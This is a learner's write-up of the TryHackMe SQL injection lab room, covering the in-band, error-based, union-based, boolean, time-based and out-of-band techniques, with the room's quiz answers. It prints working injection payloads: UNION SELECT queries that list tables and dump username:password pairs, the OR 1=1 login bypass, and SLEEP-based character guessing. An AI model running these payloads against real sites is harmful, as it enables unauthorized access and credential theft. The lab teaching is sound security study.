# [SQL Injection ( Manual ) | THM](https://tryhackme.com/room/sqlinjectionlm)

> Hamza , 21/3/22

In this room, you'll learn what databases are, what SQL is with some basic SQL commands, how to detect SQL vulnerabilities, how to exploit SQLi vulnerabilities and as a developer how you can protect yourself against SQL Injection.

------

# Sources : [SQL Tutorial](https://www.w3schools.com/sql/) , [Advanced SQL Tutorial](https://www.kaggle.com/learn/advanced-sql) , [Advanced SQL Functions](https://www.geeksforgeeks.org/sql-advanced-functions/)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f31d5855476c01e8359df000da4ac79d.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cee2844345f5ab5bc704b163797b3604.png)


## What does SQL stand for?

`Structured Query Language`

## What is the acronym for the software that controls a database?

`DBMS`

## What is the name of the grid-like structure which holds the data?

`Table`

-----------------------

# Manual Exploitation

## Level 1 :
## In-Band SQL Injection

>**In-Band SQL Injection** is the easiest type to detect and exploit; In-Band just refers to the same **method of communication being used to exploit the vulnerability** and also receive the results, for example, **discovering an SQL Injection vulnerability** on a website page and then being able to extract data from the database to the same page.

```sql
'
```

![](https://i.imgur.com/1jMAcWV.png)

## Level 2 :

## Error-Based SQL Injection

>This type of SQL Injection is the most useful for easily **obtaining information about the database structure as error messages** from the database are **printed directly to the browser screen.** This can often be used to enumerate a whole database. 


**Should be communication with the database**

```sql
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

![](https://i.imgur.com/1jMAcWV.png)


## Level 3 :

## Union-Based SQL Injection

> This type of Injection utilities the **SQL UNION operator alongside a SELECT statement** to return **additional results to the page**. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

**This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query**

```sql
1 union select 1
```
**Repeat by adding another column**

```sql
1 union select 1,2
```
**Until the error message gone.**

```sql
1 union select 1,2,3
```

![](https://i.imgur.com/eATEt7c.png)

**Now we need the first query to produce no results (ID=0) and using Advanced SQL functions
to gather information.**

## USER() Function

```sql
0 union select 1,2,USER()
```

![](https://i.imgur.com/sTmu31K.png)

## VERSION() Function

```sql
0 union select 1,2,VERSION()
```

![](https://i.imgur.com/EmefV8j.png)

## DATABASE() Function

```sql
0 union select 1,2,DATABASE()
```

![](https://i.imgur.com/Rfux2XG.png)

## TABLES

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

![](https://i.imgur.com/rsUIsyM.png)

## COLUMNS

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

![](https://i.imgur.com/9PGbOO7.png)

## DATA

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

![](https://i.imgur.com/l9ezGZS.png)

-----------------

# Blind SQLi

> Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, **blind SQLi is when we get little to no feedback to confirm whether our injected queries were**, in fact, successful or not, this is **because the error messages have been disabled**, **but the injection still works regardless**. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.


## Level 1 :

## Authentication Bypass

> One of the most straightforward Blind SQL Injection techniques is when **bypassing authentication methods such as login forms**. In this instance, **we aren't that interested in retrieving data from the database**; We just want to **get past the login**. 

## Normal Query

```sql
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

## Injected Query

We should know the **correct username** and we replace password with `' OR 1=1;--` **depending on database type**.

```sql
select * from users where username='' and password='' OR 1=1;
```

![](https://i.imgur.com/PqyvnxX.png)

## Level 2 :

## Boolean Based

> Boolean based SQL Injection refers to the response we receive back from our injection attempts which **could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes**. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited **response can't provide much information**. **Still, in fact, with just these two responses**, it's possible to enumerate a whole database structure and contents.

## Normal Query

```sql
select * from users where username = '%username%' LIMIT 1;
```

![](https://i.imgur.com/O2n5NSI.png)

## Injection

**Now you move onto the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.**


## DATABASE()

```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
![](https://i.imgur.com/MMjnr9O.png)

## TABLES

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```
![](https://i.imgur.com/RqnZblf.png)


## COLUMNS

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

![](https://i.imgur.com/yyxeF0K.png)

## DATA

```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

![](https://i.imgur.com/PTGx2lM.png)


## Level 3 :

## Time-Based

> A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, **but there is no visual indicator of your queries** being wrong or right this time. Instead, **your indicator of a correct query is based on the time the query** takes to complete. This time delay is introduced by using built-in methods such as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

![](https://i.imgur.com/Vf7RcxW.png)

## Number of columns in a table

```sql
admin123' UNION SELECT SLEEP(5);--
```


## DATABASE

```sql
admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

## TABLES

```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

## COLUMNS

```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

## DATA

```sql
admin123' UNION SELECT SLEEP(5),2 from users where username like 'a%
admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like 'a%
```

![](https://i.imgur.com/zhmaKWZ.png)


## Level 4 :

## Out-of-Band SQL Injection

> Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

# [TUTORIAL](https://www.youtube.com/watch?v=soPDfYl2Ef8)
---------------------------
